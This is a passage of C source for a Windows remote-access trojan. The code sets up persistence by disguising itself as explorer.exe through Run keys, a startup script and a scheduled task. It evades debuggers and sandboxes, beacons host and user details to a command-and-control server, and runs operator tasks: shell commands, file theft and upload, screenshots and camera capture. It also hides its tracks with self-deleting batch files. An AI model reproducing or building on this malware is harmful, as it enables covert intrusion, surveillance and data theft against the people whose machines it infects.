    normalize_path(arg, clean, sizeof(clean));
    // Try simple delete first
    if (DeleteFileA(clean)) return _strdup("[+] Deleted");
    // Try RemoveDirectory
    if (RemoveDirectoryA(clean)) return _strdup("[+] Directory removed");
    // For stubborn files: use cmd.exe rmdir /s /q for dirs, del /f /q for files
    DWORD attr = GetFileAttributesA(clean);
    char cmd[4096];
    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
        snprintf(cmd, sizeof(cmd), "cmd.exe /c rmdir /s /q \"%s\"", clean);
    } else {
        snprintf(cmd, sizeof(cmd), "cmd.exe /c del /f /q \"%s\"", clean);
    }
    return exec_shell(cmd);
}

// ====== PERSISTENCE ======
static void silent_cmd(const char *fmt, ...) {
    char cmd[4096];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(cmd, sizeof(cmd), fmt, ap);
    va_end(ap);
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 8000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// Migration state (set by persist, executed after result is sent home)
static int g_do_migrate = 0;
static char g_orig_exe[MAX_PATH] = "";
static char g_persist_dest[MAX_PATH] = "";

static char *persist(void) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
    BOOL admin = is_admin();
    int methods = 0;

    // Method 1: Copy to AppData disguised as system file
    char dest[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", dest, sizeof(dest));
    strcat(dest, "\\Microsoft\\Windows\\explorer.exe");
    char dir[MAX_PATH];
    strncpy(dir, dest, sizeof(dir));
    char *last = strrchr(dir, '\\');
    if (last) { *last = 0; CreateDirectoryA(dir, NULL); }
    if (CopyFileA(exe_path, dest, FALSE)) methods++;

    // Method 2: Registry Run key (HKCU)
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsExplorer", 0, REG_SZ, (const BYTE*)dest, (DWORD)strlen(dest));
        RegCloseKey(hKey);
        methods++;
    }
    // HKLM if admin
    if (admin && RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsExplorer", 0, REG_SZ, (const BYTE*)dest, (DWORD)strlen(dest));
        RegCloseKey(hKey);
        methods++;
    }

    // Method 3: Startup folder
    char startup[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", startup, sizeof(startup));
    strcat(startup, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\explorer.vbs");
    char vbsContent[1024];
    snprintf(vbsContent, sizeof(vbsContent),
        "Set objShell = CreateObject(\"WScript.Shell\")\r\nobjShell.Run \"%s\", 0, False\r\n", dest);
    HANDLE hFile = CreateFileA(startup, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hFile, vbsContent, (DWORD)strlen(vbsContent), &w, NULL);
        CloseHandle(hFile);
        methods++;
    }

    // Method 4: Scheduled Task (admin)
    if (admin) {
        silent_cmd("cmd.exe /c schtasks /create /f /tn \"WindowsExplorerUpdate\" /tr \"%s\" /sc ONLOGON /rl HIGHEST", dest);
        methods++;
    }

    // Defer migration until after the result is sent to C2
    if (methods > 0 && _stricmp(exe_path, dest) != 0) {
        g_do_migrate = 1;
        strncpy(g_orig_exe, exe_path, MAX_PATH - 1);
        strncpy(g_persist_dest, dest, MAX_PATH - 1);
    }

    char result[256];
    snprintf(result, sizeof(result), "[+] Persistence added (%d methods)", methods);
    return _strdup(result);
}

// Called from main loop AFTER result has been posted:
// spawn persistent copy, then make the original vanish
static void do_migrate(void) {
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    // Launch the persistent copy (same UUID via shared uuid file)
    CreateProcessA(g_persist_dest, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);

    // Delayed-delete batch: removes the originally downloaded exe,
    // so on the target's desktop it looks like the file deleted itself
    char bat[MAX_PATH], content[1024];
    GetEnvironmentVariableA("TEMP", bat, sizeof(bat));
    strcat(bat, "\\svchost_task.bat");
    snprintf(content, sizeof(content),
        "@echo off\r\n"
        "timeout /t 4 /nobreak >nul\r\n"
        "del /f /q \"%s\" 2>nul\r\n"
        "del /f /q \"%%~f0\" 2>nul\r\n",
        g_orig_exe);
    HANDLE h = CreateFileA(bat, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(h, content, (DWORD)strlen(content), &w, NULL);
        CloseHandle(h);
        STARTUPINFOA si2 = { sizeof(si2) };
        si2.dwFlags = STARTF_USESHOWWINDOW;
        si2.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi2;
        memset(&pi2, 0, sizeof(pi2));
        CreateProcessA(NULL, bat, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2);
        if (pi2.hProcess) CloseHandle(pi2.hProcess);
        if (pi2.hThread) CloseHandle(pi2.hThread);
    }
    Sleep(500);
    ExitProcess(0);
}

static void self_destruct(void) {
    // Step 1: Remove persistence artifacts
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "WindowsExplorer");
        RegCloseKey(hKey);
    }
    if (is_admin() && RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "WindowsExplorer");
        RegCloseKey(hKey);
    }

    // Step 2: Delete scheduled task
    silent_cmd("cmd.exe /c schtasks /delete /tn \"WindowsExplorerUpdate\" /f 2>nul");

    // Step 3: Delete startup VBS
    char startup[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", startup, sizeof(startup));
    strcat(startup, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\explorer.vbs");
    DeleteFileA(startup);

    // Step 4: Delete the copied exe
    char dest[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", dest, sizeof(dest));
    strcat(dest, "\\Microsoft\\Windows\\explorer.exe");
    // Use MoveFileEx to schedule deletion on reboot (works even for running files)
    typedef BOOL (WINAPI *pMoveFileExA)(LPCSTR, LPCSTR, DWORD);
    pMoveFileExA fnMoveFileEx = (pMoveFileExA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "MoveFileExA");
    if (fnMoveFileEx) fnMoveFileEx(dest, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    DeleteFileA(dest);

    // Step 5: Delete UUID file
    DeleteFileW(g_uuid_path);

    // Step 6: Delete current executable
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
    if (fnMoveFileEx) fnMoveFileEx(exe_path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    DeleteFileA(exe_path);

    // Step 7: Create a cleanup batch that runs and deletes itself
    char bat_path[MAX_PATH];
    GetEnvironmentVariableA("TEMP", bat_path, sizeof(bat_path));
    strcat(bat_path, "\\cleanup.bat");
    char bat_content[2048];
    snprintf(bat_content, sizeof(bat_content),
        "@echo off\r\n"
        "ping -n 3 127.0.0.1 >nul\r\n"
        "del /f /q \"%s\" 2>nul\r\n"
        "del /f /q \"%s\" 2>nul\r\n"
        "del /f /q \"%s\" 2>nul\r\n"
        "del /f /q \"%s\" 2>nul\r\n"
        "del /f /q \"%s\" 2>nul\r\n"
        "del /f /q \"%%~f0\" 2>nul\r\n",
        dest, exe_path, startup, bat_path, g_uuid_path);
    HANDLE hBat = CreateFileA(bat_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hBat != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hBat, bat_content, (DWORD)strlen(bat_content), &w, NULL);
        CloseHandle(hBat);
        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi;
        char cmd[MAX_PATH + 10];
        snprintf(cmd, sizeof(cmd), "cmd.exe /c \"%s\"", bat_path);
        CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    ExitProcess(0);
}

// ====== COMMAND DISPATCH ======
static char *exec_task(const char *cmd) {
    if (!cmd || !cmd[0]) return _strdup("[ERROR] empty command");
    char buf[4096];
    strncpy(buf, cmd, sizeof(buf)-1);
    buf[sizeof(buf)-1] = 0;
    char *sp = strchr(buf, ' ');
    size_t alen = sp ? (size_t)(sp - buf) : strlen(buf);
    char action[256];
    strncpy(action, buf, alen);
    action[alen] = 0;
    const char *arg = sp ? sp + 1 : "";

    if (!strcmp(action, "shell")) return exec_shell(arg);
    if (!strcmp(action, "browse")) return browse_dir(arg);
    if (!strcmp(action, "drives")) return list_drives();
    if (!strcmp(action, "read")) return read_file(arg);
    // pull  = transfer file TARGET -> C2 (operator downloads from target)
    // push  = transfer file C2 -> TARGET (operator uploads to target)
    if (!strcmp(action, "pull") || !strcmp(action, "upload")) return upload_file(arg);
    if (!strcmp(action, "push") || !strcmp(action, "download")) return cmd_download(arg);
    if (!strcmp(action, "run")) return cmd_run(arg, SW_SHOW);
    if (!strcmp(action, "runhide")) return cmd_run(arg, SW_HIDE);
    if (!strcmp(action, "delete")) return cmd_delete(arg);
    if (!strcmp(action, "screenshot")) return take_screenshot();
    if (!strcmp(action, "camera") || !strcmp(action, "cam")) return cmd_camera();
    if (!strcmp(action, "ping")) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        char *b = (char*)malloc(64);
        snprintf(b, 64, "[PONG] %04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        return b;
    }
    if (!strcmp(action, "persist")) return persist();
    if (!strcmp(action, "die") || !strcmp(action, "killself")) { ExitProcess(0); return _strdup("[DEAD]"); }
    if (!strcmp(action, "selfdestruct")) { self_destruct(); return _strdup("[SELFDESTRUCT]"); }
    // Default: run as shell command
    return exec_shell(cmd);
}

// ====== MAIN ======
int main(void) {
    // Step 1: Evasion
    resolve_apis();
    FreeConsole();
    if (is_debugged()) return 0;
    if (is_sandbox()) return 0;

    // Step 2: Init
    obfs_init();
    srand((unsigned)GetTickCount() ^ (unsigned)(uintptr_t)GetModuleHandle(NULL));
    load_uuid();
    get_sysinfo();

    // Step 3: Main loop
    while (1) {
        char *uuid_e = json_escape(g_uuid);
        char *host_e = json_escape(g_hostname);
        char *user_e = json_escape(g_username);

        char body[4096];
        snprintf(body, sizeof(body),
            "{\"uuid\":%s,\"hostname\":%s,\"os\":\"Windows\",\"username\":%s,\"privilege\":\"%s\",\"pid\":%d}",
            uuid_e, host_e, user_e, is_admin() ? "admin" : "user", GetCurrentProcessId());

        free(uuid_e);
        free(host_e);
        free(user_e);

        int sleep_sec = 30;
        int tasks_executed = 0;
        char *resp = http_post("beacon", body);

        if (resp) {
            // Parse tasks
            const char *ts = strstr(resp, "\"tasks\"");
            if (ts && (ts = strchr(ts, '['))) {
                while (*ts && *ts != ']') {
                    const char *os = strchr(ts, '{');
                    if (!os) break;
                    const char *oe = strchr(os, '}');
                    if (!oe) break;
                    size_t olen = oe - os + 1;
                    char *task = (char*)malloc(olen + 1);
                    strncpy(task, os, olen);
                    task[olen] = 0;
                    char *tid = extract_value(task, "\"id\"");
                    char *tcmd = extract_value(task, "\"command\"");
                    free(task);
                    if (tid && tcmd) {
                        char *output = exec_task(tcmd);
                        if (output) {
                            char *out_e = json_escape(output);
                            free(output);
                            if (out_e) {
                                char *uuid_e2 = json_escape(g_uuid);
                                if (uuid_e2) {
                                    size_t rb_sz = strlen(out_e) + strlen(tid) + strlen(uuid_e2) + 128;
                                    char *rb = (char*)malloc(rb_sz);
                                    if (rb) {
                                        snprintf(rb, rb_sz,
                                            "{\"task_id\":%s,\"beacon_uuid\":%s,\"output\":%s,\"status\":\"completed\"}",
                                            tid, uuid_e2, out_e);
                                        char *rr = http_post("result", rb);
                                        free(rr);
                                        free(rb);
                                    }
                                    free(uuid_e2);
                                }
                                free(out_e);
                            }
                        }
                    }
                    tasks_executed++;
                    free(tid);
                    free(tcmd);
                    ts = oe + 1;
                }
            }
            // Parse sleep
            const char *sl = strstr(resp, "\"sleep\"");
            if (sl) {
                sleep_sec = extract_int(sl + 6);
                if (sleep_sec < 5) sleep_sec = 5;
                if (sleep_sec > 3600) sleep_sec = 3600;
            }
            free(resp);
        }
        // Migration happens here: result already sent home
        if (g_do_migrate) do_migrate();
        if (tasks_executed > 0) {
            // Burst mode: just handled tasks, check back fast for follow-ups
            Sleep(2000 + rand() % 1500);
        } else {
            // Sleep with jitter
            int jitter = sleep_sec - (sleep_sec / 3) + (rand() % ((sleep_sec * 2) / 3 + 1));
            if (jitter < 5) jitter = 5;
            if (jitter > 3600) jitter = 3600;
            Sleep(jitter * 1000);
        }
    }
}
